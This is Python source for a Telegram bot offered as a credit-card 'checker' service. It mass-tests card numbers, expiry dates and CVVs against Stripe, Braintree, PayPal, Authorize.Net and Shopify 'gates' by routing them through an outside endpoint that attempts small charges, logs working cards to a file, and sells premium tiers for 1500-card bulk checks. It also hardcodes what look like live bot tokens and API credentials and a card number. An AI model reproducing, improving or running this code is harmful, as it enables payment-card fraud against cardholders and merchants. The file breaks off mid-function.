from telethon import TelegramClient, events, Button
from telethon.tl.types import KeyboardButtonCallback
import requests, random, datetime, json, os, re, asyncio, time
import string
import hashlib
import aiohttp
import aiofiles
from urllib.parse import urlparse

# --- Import the command handlers from their separate files ---
from st_commands import register_handlers as register_st_handlers
from stc_commands import register_handlers as register_stc_handlers
from bt_commands import register_handlers as register_bt_handlers
from au_commands import register_handlers as register_au_handlers
from py_commands import register_handlers as register_py_handlers
from sq_commands import register_handlers as register_sq_handlers
from chk_command import register_handlers as register_chk_handlers

# Config
API_ID = 22938404
API_HASH = "1d0f1bc81aba5f2644d124e61453362c"
BOT_TOKEN = "8447045968:AAE8PTC8-YEU71M2seuNW0jKrmoBQBukdcU" # Your PayPal Bot Token
ADMIN_ID = [7292047135] # Your Admin ID
GROUP_ID = -1003105072248 # Replace with your Group ID

# Files
PREMIUM_FILE = "premium.json"
FREE_FILE = "free_users.json"
SITE_FILE = "user_sites.json"
KEYS_FILE = "keys.json"
CC_FILE = "cc.txt"
BANNED_FILE = "banned_users.json"

ACTIVE_MTXT_PROCESSES = {}

# --- Utility Functions ---

async def create_json_file(filename):
    try:
        if not os.path.exists(filename):
            async with aiofiles.open(filename, "w") as file:
                await file.write(json.dumps({}))
    except Exception as e:
        print(f"Error creating {filename}: {str(e)}")

async def initialize_files():
    for file in [PREMIUM_FILE, FREE_FILE, SITE_FILE, KEYS_FILE, BANNED_FILE]:
        await create_json_file(file)

async def load_json(filename):
    try:
        if not os.path.exists(filename):
            await create_json_file(filename)
        async with aiofiles.open(filename, "r") as f:
            content = await f.read()
            return json.loads(content)
    except Exception as e:
        print(f"Error loading {filename}: {str(e)}")
        return {}

async def save_json(filename, data):
    try:
        async with aiofiles.open(filename, "w") as f:
            await f.write(json.dumps(data, indent=4))
    except Exception as e:
        print(f"Error saving {filename}: {str(e)}")

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

async def is_premium_user(user_id):
    premium_users = await load_json(PREMIUM_FILE)
    user_data = premium_users.get(str(user_id))
    if not user_data: return False
    expiry_date = datetime.datetime.fromisoformat(user_data['expiry'])
    current_date = datetime.datetime.now()
    if current_date > expiry_date:
        del premium_users[str(user_id)]
        await save_json(PREMIUM_FILE, premium_users)
        return False
    return True

async def add_premium_user(user_id, days):
    premium_users = await load_json(PREMIUM_FILE)
    expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)
    premium_users[str(user_id)] = {
        'expiry': expiry_date.isoformat(),
        'added_by': 'admin',
        'days': days
    }
    await save_json(PREMIUM_FILE, premium_users)

async def remove_premium_user(user_id):
    premium_users = await load_json(PREMIUM_FILE)
    if str(user_id) in premium_users:
        del premium_users[str(user_id)]
        await save_json(PREMIUM_FILE, premium_users)
        return True
    return False

async def is_banned_user(user_id):
    banned_users = await load_json(BANNED_FILE)
    return str(user_id) in banned_users

async def ban_user(user_id, banned_by):
    banned_users = await load_json(BANNED_FILE)
    banned_users[str(user_id)] = {
        'banned_at': datetime.datetime.now().isoformat(),
        'banned_by': banned_by
    }
    await save_json(BANNED_FILE, banned_users)

async def unban_user(user_id):
    banned_users = await load_json(BANNED_FILE)
    if str(user_id) in banned_users:
        del banned_users[str(user_id)]
        await save_json(BANNED_FILE, banned_users)
        return True
    return False

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as res:
                if res.status != 200: return "BIN Info Not Found", "-", "-", "-", "-", "🏳️"
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '🏳️')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError: return "-", "-", "-", "-", "-", "🏳️"
    except Exception: return "-", "-", "-", "-", "-", "🏳️"

def normalize_card(text):
    if not text: return None
    text = text.replace('\n', ' ').replace('/', ' ')
    numbers = re.findall(r'\d+', text)
    cc = mm = yy = cvv = ''
    for part in numbers:
        if len(part) == 16: cc = part
        elif len(part) == 4 and part.startswith('20'): yy = part[2:]
        elif len(part) == 2 and int(part) <= 12 and mm == '': mm = part
        elif len(part) == 2 and not part.startswith('20') and yy == '': yy = part
        elif len(part) in [3, 4] and cvv == '': cvv = part
    if cc and mm and yy and cvv: return f"{cc}|{mm}|{yy}|{cvv}"
    return None

def extract_json_from_response(response_text):
    if not response_text: return None
    start_index = response_text.find('{')
    if start_index == -1: return None
    brace_count = 0
    end_index = -1
    for i in range(start_index, len(response_text)):
        if response_text[i] == '{': brace_count += 1
        elif response_text[i] == '}':
            brace_count -= 1
            if brace_count == 0:
                end_index = i
                break
    if end_index == -1: return None
    json_text = response_text[start_index:end_index + 1]
    try: return json.loads(json_text)
    except json.JSONDecodeError: return None

async def check_card_random_site(card, sites):
    if not sites: return {"Response": "ERROR", "Price": "-", "Gateway": "-"}, -1
    selected_site = random.choice(sites)
    site_index = sites.index(selected_site) + 1
    try:
        url = f"https://kamalxd.com/withoutproxy.php?cc={card}&site={selected_site}"
        timeout = aiohttp.ClientTimeout(total=90)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200: return {"Response": f"HTTP_ERROR_{res.status}", "Price": "-", "Gateway": "-"}, site_index
                response_text = await res.text()
                json_data = extract_json_from_response(response_text)
                if json_data: return json_data, site_index
                else: return {"Response": "INVALID_JSON", "Price": "-", "Gateway": "-"}, site_index
    except Exception as e: return {"Response": str(e), "Price": "-", "Gateway": "-"}, site_index

async def check_card_specific_site(card, site):
    try:
        url = f"https://kamalxd.com/withoutproxy.php?cc={card}&site={site}"
        timeout = aiohttp.ClientTimeout(total=90)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200: return {"Response": f"HTTP_ERROR_{res.status}", "Price": "-", "Gateway": "-"}
                response_text = await res.text()
                json_data = extract_json_from_response(response_text)
                if json_data: return json_data
                else: return {"Response": "INVALID_JSON", "Price": "-", "Gateway": "-"}
    except Exception as e: return {"Response": str(e), "Price": "-", "Gateway": "-"}

def extract_card(text):
    match = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4: yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return normalize_card(text)

def extract_all_cards(text):
    cards = []
    for line in text.splitlines():
        card = extract_card(line)
        if card: cards.append(card)
    return cards

async def can_use(user_id, chat):
    if await is_banned_user(user_id):
        return False, "banned"

    is_premium = await is_premium_user(user_id)
    is_private = chat.id == user_id

    # Check channel membership for free users
    if not is_premium:
        try:
            member = await client.get_permissions("@PinkoXD", user_id)
            if not member.is_banned and member.participant:
                pass  # User is in channel
            else:
                return False, "not_joined"
        except:
            return False, "not_joined"

    if is_private:
        if is_premium:
            return True, "premium_private"
        else:
            return False, "no_access"
    else:  # In a group
        if is_premium:
            return True, "premium_group"
        else:
            return True, "group_free"

def get_cc_limit(access_type, user_id=None):
    # Check if user is admin first
    if user_id and user_id in ADMIN_ID:
        return 1500
    if access_type in ["premium_private", "premium_group"]:
        return 1500
    elif access_type == "group_free":
        return 50
    return 0

async def save_approved_card(card, status, response, gateway, price):
    try:
        async with aiofiles.open(CC_FILE, "a", encoding="utf-8") as f:
            await f.write(f"{card} | {status} | {response} | {gateway} | {price}\n")
    except Exception as e: print(f"Error saving card to {CC_FILE}: {str(e)}")

async def pin_charged_message(event, message):
    try:
        if event.is_group: await message.pin()
    except Exception as e: print(f"Failed to pin message: {e}")

def is_valid_url_or_domain(url):
    domain = url.lower()
    if domain.startswith(('http://', 'https://')):
        try: parsed = urlparse(url)
        except: return False
        domain = parsed.netloc
    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
    return bool(re.match(domain_pattern, domain))

def extract_urls_from_text(text):
    clean_urls = set()
    lines = text.split('\n')
    for line in lines:
        cleaned_line = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip()).split(' ')[0]
        if cleaned_line and is_valid_url_or_domain(cleaned_line): clean_urls.add(cleaned_line)
    return list(clean_urls)

def is_site_dead(response_text):
    if not response_text: return True
    response_lower = response_text.lower()
    dead_indicators = [
        "receipt id is empty", "handle is empty", "product id is empty", "tax amount is empty",
        "payment method identifier is empty", "invalid url", "error in 1st req", "error in 1 req", "cloudflare", "failed",
        "connection failed", "timed out", "access denied", "tlsv1 alert", "ssl routines",
        "could not resolve", "domain name not found", "name or service not known",
        "openssl ssl_connect", "empty reply from server", "HTTP_ERROR_504", "http error", "http_error_504"
    ]
    return any(indicator in response_lower for indicator in dead_indicators)

async def test_single_site(site, test_card="4031630422575208|01|2030|280"):
    try:
        url = f"https://kamalxd.com/withoutproxy.php?cc={test_card}&site={site}"
        timeout = aiohttp.ClientTimeout(total=90)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200: return {"status": "dead", "response": f"HTTP {res.status}", "site": site, "price": "-"}
                response_text = await res.text()
                json_data = extract_json_from_response(response_text)
                if not json_data: return {"status": "dead", "response": "Invalid JSON", "site": site, "price": "-"}
                response_msg = json_data.get("Response", "")
                price = json_data.get("Price", "-")
                if is_site_dead(response_msg): return {"status": "dead", "response": response_msg, "site": site, "price": price}
                else: return {"status": "working", "response": response_msg, "site": site, "price": price}
    except Exception as e: return {"status": "dead", "response": str(e), "site": site, "price": "-"}

client = TelegramClient('cc_bot', API_ID, API_HASH)

def banned_user_message():
    return "🚫 **𝙔𝙤𝙪 𝘼𝙧𝙚 𝘽𝙖𝙣𝙣𝙚𝙙!**\n\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙡𝙡𝙤𝙬𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩.\n\n𝙁𝙤𝙧 𝙖𝙥𝙥𝙚𝙖𝙡, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙤𝙙_𝘽𝙮_𝙆𝙖𝙢𝙖𝙡"

def access_denied_message_with_button():
    """Returns access denied message and join group button"""
    message = """⛔ **Premium Access Required!**

━━━━━━━━━━━━━━━━━
This command is restricted to premium users only.

💎 **Get Premium Access:**
Contact our administrators:

👑 **Owner:** @TagKhan
🛡️ **Co-Owner:** @VuKro

━━━━━━━━━━━━━━━━━
🔥 **Premium Benefits:**
✅ 1500 CC limit
✅ All gates unlocked
✅ Mass checks enabled
✅ Private chat access
✅ Priority support

💡 Type /help for more info"""
    buttons = None
    return message, buttons

def channel_join_required_message():
    """Returns channel join required message"""
    message = """⚠️ **Channel Membership Required!**

━━━━━━━━━━━━━━━━━
To use this bot, you must join our channel first!

🔥 **Free users can:**
✅ Check cards in group (single check only)
✅ Use CC Generator
✅ Access all gates

❌ **Cannot:**
❌ Use mass checks (premium only)
❌ Check in private chat

━━━━━━━━━━━━━━━━━
👇 Join our channel below, then try again!"""
    buttons = [[Button.url("📢 Join Channel", "https://t.me/PinkoXD")]]
    return message, buttons

# --- Bot Command Handlers ---

@client.on(events.NewMessage(pattern=r'^[/.!]help'))
async def help_command(event):
    """Help command showing bot info and contacts"""
    user = await event.get_sender()
    username = user.first_name if user.first_name else "User"
    
    text = f"""👋 **Hello {username}!**

━━━━━━━━━━━━━━━━━
🤖 **Bot Information**

**Bot Name:** NANOBOT CC Checker
**Version:** 2.0
**Channel:** @PinkoXD

━━━━━━━━━━━━━━━━━
👥 **Administration**

👑 **Owner:** @TagKhan
🛡️ **Co-Owner:** @VuKro

━━━━━━━━━━━━━━━━━
🆓 **Free User Access:**
✅ Single card checks in group
✅ All gates available
✅ CC Generator & Tools
✅ 50 card limit
❌ No mass checks
❌ No private chat

💎 **Premium Benefits:**
✅ 1500 CC limit
✅ Mass checks enabled
✅ Private chat access
✅ All features unlocked
✅ Priority support

━━━━━━━━━━━━━━━━━
📋 **Quick Commands:**
`/start` - Main menu
`/gates` - View all gates
`/gen` - CC Generator
`/info` - Your account info
`/register` - Register as free user

━━━━━━━━━━━━━━━━━
💬 **Need Help?**
Contact: @TagKhan or @VuKro
Channel: @PinkoXD"""
    
    await event.reply(text)

@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
async def start(event):
    _, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    
    user = await event.get_sender()
    username = user.first_name if user.first_name else "User"
    user_id = event.sender_id
    
    # Get anime GIF from API
    anime_gif = None
    try:
        import httpx
        async with httpx.AsyncClient(timeout=3.0) as client_http:
            response = await client_http.get("https://api.waifu.pics/sfw/wave")
            if response.status_code == 200:
                anime_gif = response.json().get("url")
    except:
        pass
    
    # Check account status
    if access_type in ["premium_private", "premium_group"]:
        status_text = "Registered ✅"
        status_emoji = "✅"
    else:
        status_text = "Registered ✅"
        status_emoji = "✅"
    
    text = f"""**Hello {username}!** 👋
How can I help you today?

━━━━━━━━━━━━━━━━━
📊 **Account Information**
━━━━━━━━━━━━━━━━━

👤 **User ID:** `{user_id}`
✅ **Status:** Premium Access
💎 **CC Limit:** 1500 Cards
🎯 **Bot Version:** 2.0

━━━━━━━━━━━━━━━━━
Choose an option below to get started.
Need help? Contact [Support](https://t.me/YourSupport)"""
    
    buttons = [
        [Button.inline("🎯 Gates", b"gates_menu")],
        [Button.inline("🔐 Auth Gates", b"auth_gates"), Button.inline("💳 Charge Gates", b"charge_gates")],
        [Button.inline("🛒 Shopify", b"shopify_gates"), Button.inline("🌐 Sites", b"site_checker")],
        [Button.inline("🛠️ Tools", b"tools_menu"), Button.inline("📋 Commands", b"commands")],
        [Button.inline("📝 Register", b"register_user"), Button.inline("ℹ️ Info", b"info_btn")],
        [Button.inline("❌ Close", b"close")]
    ]
    
    if anime_gif:
        await event.reply(text, file=anime_gif, buttons=buttons)
    else:
        await event.reply(text, buttons=buttons)

# --- Callback Handlers for Buttons ---
@client.on(events.CallbackQuery(pattern=b"gates_menu"))
async def gates_menu_callback(event):
    text = """📁 **GATES MENU**

Browse the available categories:

• **Auth Gates:** 2 gates
• **Charge Gates:** 4 gates 🔥
• **Shopify Gates:** 5 gates (ALL LIVE ✅)
• **Site Checker:** Manage your sites"""
    
    buttons = [
        [Button.inline("🔐 Auth Gates", b"auth_gates"), Button.inline("💳 Charge Gates", b"charge_gates")],
        [Button.inline("🛒 Shopify Gates", b"shopify_gates"), Button.inline("🌐 Site Checker", b"site_checker")],
        [Button.inline("🔙 Back", b"back_start"), Button.inline("❌ Close", b"close")]
    ]
    
    await event.edit(text, buttons=buttons)

@client.on(events.CallbackQuery(pattern=b"auth_gates"))
async def auth_gates_callback(event):
    text = """🔐 **Auth Gates**

**/st** - Stripe Auth
**/bt** - Braintree Auth

**Mass Commands:**
**/mst** - Mass Stripe Auth
**/mbt** - Mass Braintree Auth
**/mbtxt** - Braintree File Check

**Usage:** `/st card|mm|yy|cvv`"""
    
    buttons = [[Button.inline("🔙 Back", b"gates_menu"), Button.inline("❌ Close", b"close")]]
    await event.edit(text, buttons=buttons)

@client.on(events.CallbackQuery(pattern=b"charge_gates"))
async def charge_gates_callback(event):
    text = """💳 **Charge Gates**

**/tgo** - Stripe $1 🔥
**/au** - Authorize.Net $0.10 🔥
**/py** - PayPal 0.01$ 🔥
**/sh** - Shopify Self 🔥

**Mass:**
**/mtgo** `/mtgtxt` - Stripe $1 💎
**/aut** `/autxt` - Authorize.Net 💎
**/mpy** `/mpytxt` - PayPal 0.01$
**/msh** `/mtxt` - Shopify

**Usage:** `/tgo card|mm|yy|cvv`"""
    
    buttons = [[Button.inline("🔙 Back", b"gates_menu"), Button.inline("❌ Close", b"close")]]
    await event.edit(text, buttons=buttons)

@client.on(events.CallbackQuery(pattern=b"shopify_gates"))
async def shopify_gates_callback(event):
    text = """🛒 **Shopify Gates** (ALL LIVE ✅)

**/sh** - Single Shopify Check
**/msh** - Mass Shopify Check
**/mtxt** - Shopify File Check

**Site Management:**
**/add <site>** - Add Shopify site
**/rm <site>** - Remove site
**/check** - Test your sites

Use: `/sh card|mm|yy|cvv`"""
    
    buttons = [[Button.inline("🔙 Back", b"gates_menu"), Button.inline("❌ Close", b"close")]]
    await event.edit(text, buttons=buttons)

@client.on(events.CallbackQuery(pattern=b"site_checker"))
async def site_checker_callback(event):
    text = """🌐 **Site Checker**

Manage your Shopify sites:

**/add <site>** - Add new site
Example: `/add example.myshopify.com`

**/rm <site>** - Remove site
Example: `/rm example.myshopify.com`

**/check** - Test all your sites
Shows which sites are working

**/sites** - List all your sites"""
    
    buttons = [[Button.inline("🔙 Back", b"gates_menu"), Button.inline("❌ Close", b"close")]]
    await event.edit(text, buttons=buttons)

@client.on(events.CallbackQuery(pattern=b"tools_menu"))
async def tools_menu_callback(event):
    text = """🛠️ **Tools Menu**

**Available Tools:**

🔢 **CC Generator** - `/gen <bin>`
Generate valid card numbers from BIN

**Example:**
`/gen 424242` - Generate 10 cards
`/gen 424242xxxxxxxxxx` - Full BIN

**Usage:** `/gen 424242`"""
    
    buttons = [[Button.inline("🔙 Back", b"back_start"), Button.inline("❌ Close", b"close")]]
    await event.edit(text, buttons=buttons)

@client.on(events.CallbackQuery(pattern=b"commands"))
async def commands_callback(event):
    text = """📋 **All Commands**

**Single Checkers:**
`/st` - Stripe Auth
`/bt` - Braintree Auth
`/tgo` - Stripe $1 🔥
`/au` - Authorize.Net $0.10 🔥
`/py` - PayPal 0.01$ 🔥
`/sh` - Shopify Self 🔥

**Mass Checkers:**
`/mst` - Mass Stripe Auth
`/mbt` - Mass Braintree Auth
`/mtgo` - Mass Stripe $1 🔥
`/aut` - Mass Authorize.Net 🔥
`/mpy` - Mass PayPal 0.01$ 🔥
`/msh` - Mass Shopify 🔥

**File Checkers:**
`/mstxt` - Stripe File
`/mbtxt` - Braintree File
`/mtgtxt` - Stripe $1 File 🔥
`/autxt` - Authorize.Net File 🔥
`/mpytxt` - PayPal 0.01$ File
`/mtxt` - Shopify File

**Site Management:**
`/add <site>` - Add Shopify site
`/rm <site>` - Remove site
`/check` - Test your sites

**Account:**
`/info` - Your info
`/redeem <key>` - Redeem premium"""
    
    buttons = [[Button.inline("🔙 Back", b"back_start"), Button.inline("❌ Close", b"close")]]
    await event.edit(text, buttons=buttons)

@client.on(events.CallbackQuery(pattern=b"register_user"))
async def register_callback(event):
    user_id = event.sender_id
    
    # Check if already premium
    if await is_premium_user(user_id):
        text = """✅ **Already Registered!**

You already have premium access!

**Your Benefits:**
💎 1500 CC limit
💎 All gates unlocked
💎 Mass checks enabled
💎 Private chat access

**Status:** PREMIUM USER"""
        buttons = [[Button.inline("🔙 Back", b"back_start"), Button.inline("❌ Close", b"close")]]
        return await event.edit(text, buttons=buttons)
    
    # Check channel membership
    try:
        member = await client.get_permissions("@PinkoXD", user_id)
        if not member.is_banned and member.participant:
            # User is in channel - auto register as free user
            text = """✅ **Registration Successful!**

You are now registered as a FREE user!

**Your Access:**
✅ Single card checks in group
✅ All gates available
✅ CC Generator
✅ BIN Lookup

**Limitations:**
❌ No mass checks (Premium only)
❌ No private chat access
❌ 50 card limit

**Want Premium?**
👑 **Owner:** @TagKhan
🛡️ **Co-Owner:** @VuKro

💎 Premium: 1500 CC limit + Mass checks!
💡 Type /help for more info"""
            buttons = [[Button.inline("🔙 Back", b"back_start"), Button.inline("❌ Close", b"close")]]
            await event.edit(text, buttons=buttons)
        else:
            text = """⚠️ **Join Channel First!**

You must join our channel before registering!

👇 Click below to join:"""
            buttons = [
                [Button.url("📢 Join Channel", "https://t.me/PinkoXD")],
                [Button.inline("✅ I Joined", b"register_user")],
                [Button.inline("🔙 Back", b"back_start")]
            ]
            await event.edit(text, buttons=buttons)
    except:
        text = """⚠️ **Join Channel First!**

You must join our channel before registering!

👇 Click below to join:"""
        buttons = [
            [Button.url("📢 Join Channel", "https://t.me/PinkoXD")],
            [Button.inline("✅ I Joined", b"register_user")],
            [Button.inline("🔙 Back", b"back_start")]
        ]
        await event.edit(text, buttons=buttons)

@client.on(events.CallbackQuery(pattern=b"updates"))
async def updates_callback(event):
    text = """📢 **Latest Updates**

**v1.1** - Oct 24, 2025
✅ New UI with anime GIFs
✅ PayPal 1$ integrated
✅ Mass checker improvements
✅ Better output format

Join our channel for updates!"""
    
    buttons = [[Button.inline("🔙 Back", b"back_start"), Button.inline("❌ Close", b"close")]]
    await event.edit(text, buttons=buttons)

@client.on(events.CallbackQuery(pattern=b"back_start"))
async def back_start_callback(event):
    # Trigger start command again
    await start(event)

@client.on(events.CallbackQuery(pattern=b"info_btn"))
async def info_btn_callback(event):
    user_id = event.sender_id
    user = await event.get_sender()
    username = user.first_name if user.first_name else "User"
    
    text = f"""ℹ️ **Your Information**

**User:** {username}
**User ID:** `{user_id}`
**Status:** Premium Access ✅
**CC Limit:** 1500 cards
**Expiry:** Lifetime

**Available Commands:**
Use `/start` to see all commands"""
    
    buttons = [[Button.inline("🔙 Back", b"back_start"), Button.inline("❌ Close", b"close")]]
    await event.edit(text, buttons=buttons)

@client.on(events.CallbackQuery(pattern=b"close"))
async def close_callback(event):
    await event.delete()

@client.on(events.NewMessage(pattern='/auth'))
async def auth_user(event):
    if event.sender_id not in ADMIN_ID: 
        return await event.reply("⛔ **Access Denied!**\n\nThis command is restricted to administrators only.")
    try:
        parts = event.raw_text.split()
        if len(parts) != 3: 
            return await event.reply("⚠️ **Invalid Format!**\n\n**Usage:** `/auth <user_id> <days>`\n**Example:** `/auth 7292047135 30`")
        
        user_id = int(parts[1])
        days = int(parts[2])
        await add_premium_user(user_id, days)
        
        # Admin notification
        await event.reply(f"""✅ **Authorization Successful!**

👤 **User ID:** `{user_id}`
⏰ **Duration:** {days} days
💎 **Status:** Premium Activated
🔥 **CC Limit:** 1500 cards

User has been notified via DM.""")
        
        # User notification
        try:
            await client.send_message(user_id, f"""🎉 **Premium Access Granted!**

━━━━━━━━━━━━━━━━━
**Congratulations!** You've been granted premium access.

⏰ **Duration:** {days} days
💎 **CC Limit:** 1500 cards
🔥 **Features:** All gates unlocked

━━━━━━━━━━━━━━━━━
You can now use the bot in private chat with full access to all checkers!

Type `/start` to begin checking cards.""")
        except: 
            await event.reply("⚠️ Note: Could not send DM to user. They may need to start the bot first.")
    except ValueError: 
        await event.reply("❌ **Invalid Input!**\n\nUser ID and days must be numbers.")
    except Exception as e: 
        await event.reply(f"❌ **Error:** {str(e)}")

@client.on(events.NewMessage(pattern='/key'))
async def generate_keys(event):
    if event.sender_id not in ADMIN_ID: return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")
    try:
        parts = event.raw_text.split()
        if len(parts) != 3: return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /key {amount} {days}")
        amount = int(parts[1])
        days = int(parts[2])
        if amount > 10: return await event.reply("❌ 𝙈𝙖𝙭𝙞𝙢𝙪𝙢 10 𝙠𝙚𝙮𝙨 𝙖𝙩 𝙤𝙣𝙘𝙚!")
        keys_data = await load_json(KEYS_FILE)
        generated_keys = []
        for _ in range(amount):
            key = generate_key()
            keys_data[key] = {'days': days, 'created_at': datetime.datetime.now().isoformat(), 'used': False, 'used_by': None}
            generated_keys.append(key)
        await save_json(KEYS_FILE, keys_data)
        keys_text = "\n".join([f"🔑 `{key}`" for key in generated_keys])
        await event.reply(f"✅ 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙 {amount} 𝙠𝙚𝙮(𝙨) f𝙤𝙧 {days} 𝙙𝙖𝙮(𝙨):\n\n{keys_text}")
    except ValueError: await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙖𝙢𝙤𝙪𝙣𝙩 𝙤𝙧 𝙙𝙖𝙮s!")
    except Exception as e: await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/redeem'))
async def redeem_key(event):
    if await is_banned_user(event.sender_id): return await event.reply(banned_user_message())
    try:
        parts = event.raw_text.split()
        if len(parts) != 2: return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /redeem {key}")
        key = parts[1].upper()
        keys_data = await load_json(KEYS_FILE)
        if key not in keys_data: return await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙠𝙚𝙮!")
        if keys_data[key]['used']: return await event.reply("❌ 𝙏𝙝𝙞𝙨 𝙠𝙚𝙮 𝙝𝙖𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙗𝙚𝙚𝙣 𝙪𝙨𝙚𝙙!")
        if await is_premium_user(event.sender_id): return await event.reply("❌ 𝙔𝙤𝙪 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙝𝙖𝙫𝙚 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨!")
        days = keys_data[key]['days']
        await add_premium_user(event.sender_id, days)
        keys_data[key]['used'] = True
        keys_data[key]['used_by'] = event.sender_id
        keys_data[key]['used_at'] = datetime.datetime.now().isoformat()
        await save_json(KEYS_FILE, keys_data)
        await event.reply(f"🎉 𝘾𝙤𝙣𝙜𝙧𝙖𝙩𝙪𝙡𝙖𝙩𝙞𝙤𝙣𝙨!\n\n𝙔𝙤𝙪 𝙝𝙖𝙫𝙚 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙧𝙚𝙙𝙚𝙚𝙢𝙚𝙙 {days} 𝙙𝙖𝙮𝙨 𝙤𝙛 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤𝙬 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩 𝙬𝙞𝙩𝙝 1500 𝘾𝘾 𝙡𝙞𝙢𝙞𝙩!")
    except Exception as e: await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/add'))
async def add_site(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    try:
        add_text = event.raw_text[4:].strip()
        if not add_text: return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩: /add site.com site.com")
        sites_to_add = extract_urls_from_text(add_text)
        if not sites_to_add: return await event.reply("❌ 𝙉𝙤 𝙫𝙖𝙡𝙞𝙙 𝙪𝙧𝙡𝙨/𝙙𝙤𝙢𝙖𝙞𝙣𝙨 𝙛𝙤𝙪𝙣𝙙!")
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        added_sites = []
        already_exists = []
        for site in sites_to_add:
            if site in user_sites: already_exists.append(site)
            else:
                user_sites.append(site)
                added_sites.append(site)
        sites[str(event.sender_id)] = user_sites
        await save_json(SITE_FILE, sites)
        response_parts = []
        if added_sites: response_parts.append("\n".join(f"✅ 𝙎𝙞𝙩𝙚 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝘼𝙙𝙙𝙚𝙙: {s}" for s in added_sites))
        if already_exists: response_parts.append("\n".join(f"⚠️ 𝘼𝙡𝙧𝙚𝙖𝙙𝙮 𝙀𝙭𝙞𝙨𝙩𝙨: {s}" for s in already_exists))
        if response_parts: await event.reply("\n\n".join(response_parts))
        else: await event.reply("❌ 𝙉𝙤 𝙣𝙚𝙬 𝙨𝙞𝙩𝙚𝙨 𝙩𝙤 𝙖𝙙𝙙!")
    except Exception as e: await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/rm'))
async def remove_site(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    try:
        rm_text = event.raw_text[3:].strip()
        if not rm_text: return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /rm site.com")
        sites_to_remove = extract_urls_from_text(rm_text)
        if not sites_to_remove: return await event.reply("❌ 𝙉𝙤 𝙫𝙖𝙡𝙞𝙙 𝙪𝙧𝙡𝙨/𝙙𝙤𝙢𝙖𝙞𝙣𝙨 𝙛𝙤𝙪𝙣𝙙!")
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        removed_sites = []
        not_found_sites = []
        for site in sites_to_remove:
            if site in user_sites:
                user_sites.remove(site)
                removed_sites.append(site)
            else: not_found_sites.append(site)
        sites[str(event.sender_id)] = user_sites
        await save_json(SITE_FILE, sites)
        response_parts = []
        if removed_sites: response_parts.append("\n".join(f"✅ 𝙍𝙚𝙢𝙤𝙫𝙚𝙙: {s}" for s in removed_sites))
        if not_found_sites: response_parts.append("\n".join(f"❌ 𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙: {s}" for s in not_found_sites))
        if response_parts: await event.reply("\n\n".join(response_parts))
